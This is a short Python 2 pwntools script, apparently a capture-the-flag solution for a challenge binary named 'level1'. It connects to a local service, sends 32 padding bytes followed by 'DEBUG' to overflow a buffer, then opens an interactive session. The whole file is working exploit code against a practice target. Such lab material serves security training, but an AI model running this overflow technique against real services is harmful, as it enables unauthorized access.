#!/usr/bin/env python2
from pwn import *

def loc():
    return process("./level1")

def rem():
    return remote("127.0.0.1", 10001)

r = rem()
r.sendline("A" * 32 + "DEBUG")
r.recv(1024)
r.interactive()